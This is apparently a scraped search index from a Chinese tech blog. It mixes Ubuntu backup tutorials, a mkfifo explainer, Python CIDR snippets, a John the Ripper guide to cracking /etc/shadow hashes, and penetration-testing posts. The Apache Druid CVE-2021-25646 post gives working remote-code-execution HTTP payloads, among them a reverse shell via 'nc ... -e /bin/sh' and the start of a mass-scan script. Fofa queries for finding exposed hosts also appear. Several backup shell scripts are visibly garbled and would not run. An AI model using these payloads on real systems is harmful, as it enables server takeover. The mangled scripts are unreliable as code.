","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:1:1","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"备份方式 ","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:2:0","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"Shell脚本手动备份 tar打包压缩减小备份文件大小 写个简单的shell脚本 ## 如脚本内容,对指定目录打包 #!/bin/bash #备份源 backup_files=\"/opt/google /etc/Documents\" #备份目标 dest=\"/backup\" #创建归档文件(主机名-时间) day=$(date +%Y-%m-%d-%A-%T) hostname=$(hostname -s) archive_file=\"$hostnane-$day.tgz\" #显示备份状态 echo \"Backing up $backup_files to $dest/$archive_file\" date #执行备份. tar czPf $dest/$archive_file $backup_files 然后手动运行shell脚本(或做一个定时任务crontab) chmod u+x backup.sh ./backup.sh 问题：在业务繁忙时候，影响服务器性能和网络带宽，影响正常业务运行（所有基于业务空闲时候来决定备份时间） 验证备份 tar -tzvf /backup/backup.tgz 还原/恢复 # 解压到指定目录 tar -zxvf /backup/backup.tgz -C /tmp # 解压到原目录(会覆盖已有文件) cd / sudo tar -zxvf /backup/host-Monday.tgz ","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:2:1","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"Shell脚本自动备份 cron计划任务 配置文件：/etc/crontab 配置 sudo crontab -e # 这里是root权限运行（不同用户有自己的计划任务） 30 23 0 * * 1 /bin/bash /home/xps/backup.sh # 每周一的23:30执行 # 分(m,0-59) 时(h,0-23) 日(dom,1-31) 月(mon,1-12) 周(dow,0-7) 命令(command) # ctrl + o 保存， ctrl + x 退出 crontab -l # 查看当前用户已有计划任务列表 ","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:2:2","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"全量滚动备份计划 例如：每天做一个日备份，到一周就合并为一个周备份，到一个月就合并为一个月备份 两个月为周期滚动备份 每月1日执行月备份 每周六执行周备份 每天进行日备份 6个日备份 + 4个周备份 + 2个月备份 脚本 #备份源 backup_files=\" /home /var/spool/mail /etc /root /boot /opt\" #备份目标 dest=\"/backup\" #归档文件名变量(星期几 / 主机名). day=$(date +%A) hos tnane=$(hostname -s) #当前是每月中第几个星期 day_nun=S(date +%-d) if (( $day .nun \u003c= 7 )); then week_file= \"$hostname -week1.tgz\" ellf (( $day_num \u003e 7 \u0026 $day_nun \u003c= 14 )); then week_file=\"$hostname -week2.tgz \" elif (( $day_nun \u003e14 \u0026\u0026 $day_nun \u003c= 21 )); then week_file=\" $hostname -week3.tgz\" elif ( $day_num \u003e21 \u0026\u0026 $day_num \u003c 32 )); then week_file=\" hostname -week4. tgz\" fi #单数月 / 双数月 nonth_num=$(date +%m) month=$(expr $month_num % 2) # 如果余数 if [ $month -eq θ ]; then # 如果余数等于0 nonth_file=\"$hostname - nonth2.tgz\" else month_file=\"$hostname -nonth1.tgz\" fi #创建归档文件(每月1日--\u003e月备份、 每周六--\u003e周备份、每天--\u003e日备份) if [ $day_num == 1 ]; then archive_file=$month_file elif [ $day != \"Saturday\" ]; then archive_file=\" $hostname -$day.tgz\" else archive_file=$week_file fi #显示备份开始信息 echo \"Backing up Sbackup_ ftles to $dest/$archive_file\" date echo #使用tar命令备份 tar CzPf $dest/$archive_file $backup_files #显示备份结束信息 echo echo \"Backup fintshed \" date #结束后查看备份文件大小 ls -lh $dest/ 也可以加入到计划任务里面执行 缺陷： 每个备份都是完整备份 备份时间长,磁盘空间占用量大 ","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:2:3","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["Linux"],"content":"增量差异备份 Rsync Linux 下众多备份工具，只rsync是必须掌握的一个 在两个目录或两个主机之间同步文件（ 从源单向同步到目标，但不双向同步） 支持增量备份，节省时间带宽源 参数众多 学习时建议使用例子文件（使用不当可能破坏文件） 还原时：先把最前面的完整备份还原，然后依次还原后面的增量备份 文件服务器 # 创建演示文件 mkdir sampledir touch sampledir/file{1..10} 客户端同步(下拉) # 安装 apt install rsync # 同步服务端的文件 rsync -azP -e ssh xps@1.1.1.1:~/sampledir backup/ # 也可以基于密钥、密码身份认证 # sampledir 后的/表示拷贝其中所有内容,没有/表示拷贝该目录 #服务端新增、修改文件后再次运行此命令,只有变更的部分同步 #服务器断删除文件后再次运行此命令,客户端不同步删除动作 同步本地文件夹到服务端 # 源 目标 rsync /var/log/mysql ~/mysql_log_backup 计划任务 # 每天执行计划任务执行rsync crontab -e @daily rsync -azPe ssh xps@1.1.1.1:~/sampledir /backup 向上同步(推) rsync -azP -e ssh backup/ xps@1.1.1.1:~/sampledir -a =-rlptgoD # 归档，保留修改时间戳、符号链接、权限等元数据 -r # 递归拷贝目录内容(不保留权限) -l # 拷贝符号链接 -p # 保留权限 -g # 保留组所有者 -o # 保留用户所有者 -D # 保留设备文件 -v # 显示详细信息 -z # 压缩 -P # 生成进度文件，实现进程报告和断点续传 -e # 指定远程shell类型，默认rsync明文传输数据 --exclude pattern # 指定排除的文件名 --exclude-from filename.txt # 排除文件名的特征文件(把几个文件名写到一个文件里面) --include pattern # 指定包含的文件名 --include-from filename # 排除文件 rsync -azP --exclude 'dir*' source/ destination/ rsync -azP --exclude-from 'exclude-list.txt' source/ destination/ # SSH非标准端口 rsync -azP -e \"ssh -P port_number\" source destination rsync默认不删除目标文件 --delete #镜像源目的内容，源删文件目的也删 --backup #删除/覆盖前备份源文件（改名防覆盖) --backup-dir #指定备份路径 --remove-source-files #成功传输后删除来源文件 --dry-run #模拟执行命令，并输出结果(并不真正修改文件) rsync --remove-source-files -azPv srcl dest/ rsync --dry-run --remove-source-files -azPv src/ dest/ 增量备份： # touch backup.sh # chmod +x backup.sh # mv backup.sh usr/local/bin # vi backup.sh #/bin/bash CURDATE=$(date +%Y-%m-%d) rsync -avb --delete --backup-dir=/backup/$CURDATE /src /dest 其他工具 双向同步工具 sudo apt install unison unison ~lsampledir ssh:l/1.1.1.1//homelyuanfh/documents 实时同步工具 sudo apt install lsyncd #lsyncd实时监视本地文目录变化 #默认使用Rsync实现文件同步SCP / SSHFS #参考以前章节内容 SCP/SSHFS Bacula 简介 Bacula 是一款开源的跨平台网络备份工具，它提供了基于企业级的客户端/服务器的备份恢复解决方案。通过它，系统管理人员可以对数据进行备份、恢复，以及完整性验证等操作。同时，它还提供了许多高级存储管理功能，使系统管理人员能够很容易发现并恢复丢失的或已经损坏的文件。正因如此，Bacula 也被誉为最好的开源企业级备份工具。 基于网络的开源备份、还原、验证软件 对标商业备份软件的功能 客户端支持Windows(很久不更新了，主在其他系统)、Linux、Unix、MAC有多个开源工具组合而成 软件架构 Director :主进程，控制所有备份、恢复、验证、归档操作 Console:管理员于Director通信的操作借口，分为三种类型 基于文本的命令行版本(完全的功能) 基于Gnome GTK+的GUI版本(大部分功能) wxWidgets GUI版本(大部分功能) File Daemon : Bacula客户端程序，安装在需要备份的计算机上 负责在Director请求时提供文件属性和数据 恢复阶段负责恢复文件属性和数据，以后台进程的形式运行 Storage Daemon :读写备份存储介质，执行数据存储和恢复 Catalog :为所有备份文件维护索引和卷数据库 快速定位和恢复归档文件 支持 MySQL、PostgreSQL、SQLite 摘要信息(备份任务、客户端、被备份的文件以及他们存放在哪个卷上) 不存放被备份的文件本身 是bacula区别于简单备份工具的关键 Monitor :允许监视Dir、FD和SD(仅GTK+ GUI可用) C/S、模块化结构，可单机或分布式部署 最新版支持一次性写入介质和Amazon s3 适合大型环境 安装配置 1.安装数据库 sudo apt install bacula-director-pgsql # 各种根据自己情况选项 # 数据库安装在远程还是本地，创建数据库账号的密码或直接回车他自己会随机生成 sudo su postgres psql \\l # 可以查看库 \\c bacula # 连接上这个库 \\d 2.安装 Director # 和上面的数据库是可以不安装在一台机器上的 sudo apt install bacula-director #-随机生成数据库密码 #-依赖Postfix(后期配置) #-侦听TCP9101 2.1修改配置文件 #1.主配置文件 # vim /etc/bacula/bacula-dir.conf # 如果要所有网卡都侦听9101，则直接注释当前DirAddress即可 # 否则有多高个网卡要侦听不同的端口，还需要在Director下增DirAddresses,并注释之前的DIRport Director { #...... DirAddresses ={ ip = { addr = 127.0.0.1;port = 9101;} ip = { addr = 192.168.1.1; port = 9101;} } } #2.重启服务 sudo systemctrl restart bacula-director 3.安装SD(storage) sudo apt install bacula-sd # 默认监听tcp 9013端口 同样也需要修改配置文件 #1.SD配置文件 # vim /etc/bacula/bacula-sd.conf #SDAddress和SDPort注释掉，并和上面一样增加 Strage { #...... SDAddress ={ ip = { addr = 127.0.0.1;port = 9101;} ip = { addr = 192.168.1.1; port = 9101;} } } #2.重启服务 sudo systemctrl restart bacula-sd 4.安装FD(客户端) sudo apt install bacula-fd # 配置 # /etc/bacula/bacula-fd.conf # 1.FD配置 FileDaemon { #FDAddress = 127.0.0.1 # 这个机器所有ip都侦听9102端口 } #仅客户端安装 #2.重启服务 sudo systemctrl restart bacula-fd #默认监听TCP 9102 在网络中其他计算机上安装FD Windows客户端 https://sourceforge.net/projects/bacula/files/ #配置FD ## 客户端配置 #sudo vi /etc/bacula/bacula-fd.conf Director { Name = Server-dir # 指定服务器的名字Name Password= \"FmvH\" # #director: } ## 服务器端配置 # sudo vi /etc/bacula/bacula-dir.conf Client { Name = Client-fd # 指定客户器的名字Name Address = 192.168.1.2 Password =\"FmvH\" # } 5.安装Console sudo apt install bacula-console sudo bconson #进","date":"2021-07-20","objectID":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/:2:4","tags":["ubuntu","备份还原","Rsync","Bacula"],"title":"ubuntu server-备份还原","uri":"/ubuntu-server-%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"},{"categories":["工具"],"content":"简介 John the Ripper是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等。它支持多种不同类型的系统架构，包括Unix、Linux、Windows、DOS模式、BeOS和OpenVMS，主要目的是破解不够牢固的Unix/Linux系统密码。除了在各种Unix系统上最常见的几种密码哈希类型之外，它还支持Windows LM散列，以及社区增强版本中的许多其他哈希和密码。它是一款开源软件。Kali中自带John。 John the Ripper支持字典破解方式和暴力破解方式 可执行文件位置： /usr/sbin/john 密码字典所在目录：/usr/share/john/ ","date":"2021-06-08","objectID":"/%E4%BD%BF%E7%94%A8john-the-ripper%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/:0:1","tags":["John","爆破工具","爆破Linux密码"],"title":"使用John the Ripper破解密码","uri":"/%E4%BD%BF%E7%94%A8john-the-ripper%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"},{"categories":["工具"],"content":"破解Linux系统密码 1.先安装 sudo apt install john 2.使用 unshadow 命令组合 /etc/passwd 和 /etc/shadow ，组合成 test_passwd 文件（test_passwd 就是 /etc/passwd 和 /etc/shadow 的简单组合:）。 unshadow /etc/passwd /etc/shadow \u003e test_passwd 3.然后用 John 破解密码了。 # 我们可以使用 John 自带的密码字典，位于 /usr/share/john/password.lst ，也可以使用我们自己的密码字典。 # 用John自带的密码字典为例： john test_passwd # 若使用自己的密码字典： john --wordlist=字典路径 test_passw 4.查看破解信息 john --show test_passwd ","date":"2021-06-08","objectID":"/%E4%BD%BF%E7%94%A8john-the-ripper%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/:0:2","tags":["John","爆破工具","爆破Linux密码"],"title":"使用John the Ripper破解密码","uri":"/%E4%BD%BF%E7%94%A8john-the-ripper%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81/"},{"categories":["Python"],"content":"方法1：使用IPy库 from IPy import IP ip = IP('127.0.0.0/30') for x in ip: print(x) ","date":"2021-06-07","objectID":"/python%E8%A7%A3%E6%9E%90ip%E5%9C%B0%E5%9D%80cidr%E7%9A%84%E5%BD%A2%E5%BC%8F/:0:1","tags":["CIDR","python","IPy","netaddr"],"title":"Python解析IP地址CIDR的形式","uri":"/python%E8%A7%A3%E6%9E%90ip%E5%9C%B0%E5%9D%80cidr%E7%9A%84%E5%BD%A2%E5%BC%8F/"},{"categories":["Python"],"content":"方法二：使用netaddr库 CIDR也能直接转成IP地址段 from netaddr import * ip = IPNetwork('192.0.2.16/29') ip_list = list(ip) print(ip_list) [IPAddress('192.0.2.16'), IPAddress('192.0.2.17'), IPAddress('192.0.2.18'), IPAddress('192.0.2.19'), IPAddress('192.0.2.20'), IPAddress('192.0.2.21'), IPAddress('192.0.2.22'), IPAddress('192.0.2.23')] IP段208.130.29.30-35转换成CIDR格式 from netaddr import * startip = '208.130.29.30' endip = '208.130.29.35' cidrs = netaddr.iprange_to_cidrs(startip, endip) for k, v in enumerate(cidrs): iplist = v print(iplist) ","date":"2021-06-07","objectID":"/python%E8%A7%A3%E6%9E%90ip%E5%9C%B0%E5%9D%80cidr%E7%9A%84%E5%BD%A2%E5%BC%8F/:0:2","tags":["CIDR","python","IPy","netaddr"],"title":"Python解析IP地址CIDR的形式","uri":"/python%E8%A7%A3%E6%9E%90ip%E5%9C%B0%E5%9D%80cidr%E7%9A%84%E5%BD%A2%E5%BC%8F/"},{"categories":["Linux"],"content":"先复习下linux命令执行顺序 # 通常，终端只能执行一条命令, 如果要执行多条命令 # 顺序执行多条命令，可以用分号; cmd1;cmd2;cmd3 # 条件执行多条命令，使用\u0026\u0026(前一个命令执行成功，即$?=0时，执行下一条命令，否则不执行)和||(前一个命令执行失败，既$?≠0时，执行下一条命令) cmd1\u0026\u0026cmd2||cmd3 #$?:上一次命令的返回结果 ---\u003e 为0代表执行成功，不为0则为执行失败 ","date":"2021-06-07","objectID":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/:0:1","tags":["Linux命令","命名管道","mkfifo"],"title":"Linux mkfifo命令基本用法","uri":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"},{"categories":["Linux"],"content":"管道命令(pipe) 管道是一种通信机制，用于进程间的通信（也可通过socket进行网络通信），表现出来的形式将前面的每一个进程的输出，直接作为下一个进程的输入 管道命令仅能处理stdout，而error则会忽略 ","date":"2021-06-07","objectID":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/:0:2","tags":["Linux命令","命名管道","mkfifo"],"title":"Linux mkfifo命令基本用法","uri":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"},{"categories":["Linux"],"content":"常见管道命令 cut、grep、sort、wc、uniq tee：重定向，既能在屏幕输出，又能保存到文件中 tr、col、join、paste、expand、split ","date":"2021-06-07","objectID":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/:0:3","tags":["Linux命令","命名管道","mkfifo"],"title":"Linux mkfifo命令基本用法","uri":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"},{"categories":["Linux"],"content":"有名管道+无名管道=管道 有名管道(FIFO文件)：就是 有文件名的管道, 可以用于任意两个进程间的通信 无名管道(pipe文件)：就是没有文件名的管道, 只能用于父子进程之间的通信 ","date":"2021-06-07","objectID":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/:0:4","tags":["Linux命令","命名管道","mkfifo"],"title":"Linux mkfifo命令基本用法","uri":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"},{"categories":["Linux"],"content":"mkfifo mkfifo可以创建命名管道 # |（竖线）为管道，是两个进程之间的通信通道 例如：ls|grep txt #ls和grep由|分开，管道创建了程序之间的通信通道，将ls的输出作为输入传给grep # 由mkfifo创建出来的就是一个命名管道 例如：mkfifo pipe2 #pipe2就是一个命名管道。 命名管道的作用 # 可以将输出信道化到不同终端、 例如： 在第一个终端执行 ls \u003e pipe2 在第二个终端执行 cat \u003c pipe2（或cat pipe2,是取一次。cat \u003c pipe2是持续输入，只要有内容传到pipe2中，就会有内容输出） #pipe2更像是一个临时存储的地方，使用cat pipe2取过内容之后，再执行cat pipe2 ，则不会有显示 命名管道可以像正常文件一样访问，在文档类型可以看到为p： ubuntu@VM-0-14-ubuntu:~$ ll pipe2 prw-rw-r-- 1 ubuntu ubuntu 0 Jun 7 09:35 pipe2| 删除就像正常文件一样使用rm删除即可 可以使用指定的名称创建先进先出文件（FIFO） **语法格式：**mkfifo [参数] [名称] 常用参数： m \u003c模式\u003e 设置权限模式，类似chmod -Z 将每个创建的目录SELinux安全环境设置为CTX 实例： 创建FIFO文件 /tmp/fifo： ubuntu@VM-0-14-ubuntu:~$ mkfifo /tmp/fifo ubuntu@VM-0-14-ubuntu:~$ ls -l /tmp/fifo prw-rw-r-- 1 ubuntu ubuntu 0 Jun 7 09:47 /tmp/fifo ","date":"2021-06-07","objectID":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/:0:5","tags":["Linux命令","命名管道","mkfifo"],"title":"Linux mkfifo命令基本用法","uri":"/linux-mkfifo%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/"},{"categories":["渗透测试"],"content":"漏洞描述 Apache Zeppelin 存在未授权的用户访问命令执行接口，导致了任意用户都可以执行恶意命令获取服务器权限。 ","date":"2021-05-28","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:1","tags":["Apache Zeppelin","未授权任意命令执行","漏洞复现"],"title":"Apache Zeppelin 未授权任意命令执行漏洞","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Fofa icon_hash=\"960250052\" ","date":"2021-05-28","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:2","tags":["Apache Zeppelin","未授权任意命令执行","漏洞复现"],"title":"Apache Zeppelin 未授权任意命令执行漏洞","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞复现 ","date":"2021-05-28","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:3","tags":["Apache Zeppelin","未授权任意命令执行","漏洞复现"],"title":"Apache Zeppelin 未授权任意命令执行漏洞","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞描述 Apache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码。攻击者可直接构造恶意请求执行任意代码，控制服务器。 ","date":"2021-05-28","objectID":"/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-25646/:0:1","tags":["渗透测试","Apache Druid远程代码执行漏","漏洞复现","CVE-2021-25646"],"title":"Apache Druid远程代码执行漏洞复现(CVE-2021-25646)","uri":"/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-25646/"},{"categories":["渗透测试"],"content":"影响版本 Apache Druid \u003c 0.20.1 ","date":"2021-05-28","objectID":"/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-25646/:0:2","tags":["渗透测试","Apache Druid远程代码执行漏","漏洞复现","CVE-2021-25646"],"title":"Apache Druid远程代码执行漏洞复现(CVE-2021-25646)","uri":"/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-25646/"},{"categories":["渗透测试"],"content":"漏洞环境以及复现 fofa搜索： title=\"Apache Druid\" 测试漏洞是否存在 打开第一个网址，访问特定目录，目录存在: /druid/indexer/v1/sampler 利用bp抓包，发送payload： POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx​:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 995 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('ping 你的dns平台的地址')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} 注意里面有你的dns平台的地址 发送请求即可命令执行(替换为自己要执行的命令) 反弹shell请求包 POST /druid/indexer/v1/sampler HTTP/1.1 Host: xxx.xxx.xxx.xxx​:8888 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/json Content-Length: 1008 Connection: close {\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}} 批量脚本 import click import requests import sys import json requests.packages.urllib3.disable_warnings() def title(): print('+------------------------------------------') print('+ \\033[34mVersion: Apache Druid \u003c 0.20.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2021-25646.py \\033[0m') print('+------------------------------------------') def scan(host): global rep url = str(host)+\"/druid/indexer/v1/sampler\" headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\", \"Accept\": \"application/json, text/plain, */*\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Content-Type\": \"application/json\" } payload = { \"type\":\"index\", \"spec\":{ \"ioConfig\":{ \"type\":\"index\", \"inputSource\":{ \"type\":\"inline\", \"data\":\"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"delta","date":"2021-05-28","objectID":"/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-25646/:0:3","tags":["渗透测试","Apache Druid远程代码执行漏","漏洞复现","CVE-2021-25646"],"title":"Apache Druid远程代码执行漏洞复现(CVE-2021-25646)","uri":"/apache-druid%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-cve-2021-25646/"},{"categories":null,"content":"How far you have gone is the thing youshould think every time you think ofquitting.lt is not how hard the battleis, but how you are fighting to win thebattle.In life, you would encounternumerous things that would challengeyou.You have to be a soldier of your ownfate and your own battle. 每当你想要放弃, 应该静静想一想。你已经一路坚持走了多远。生活不在于有些战役多么难打。而在于你怎样拼尽全力 去赢得每一个胜利。在生活中, 你会遇到许许多多的挑战。做一个勇敢的战士,主宰命运,战无不胜。 ","date":"2021-05-27","objectID":"/%E5%BD%93%E4%BD%A0%E6%83%B3%E6%94%BE%E5%BC%83%E6%97%B6/:0:0","tags":null,"title":"当你想放弃时","uri":"/%E5%BD%93%E4%BD%A0%E6%83%B3%E6%94%BE%E5%BC%83%E6%97%B6/"},{"categories":["渗透测试"],"content":"声明 由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。d ","date":"2021-05-20","objectID":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:1","tags":["泛微OA","漏洞复现","文件上传","渗透测试"],"title":"泛微OA weaver.common.Ctrl 任意文件上传漏洞","uri":"/%E6%B3%9B%E5%BE%AEoa-weaver-common-ctrl-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞描述 泛微OA weaver.common.Ctrl 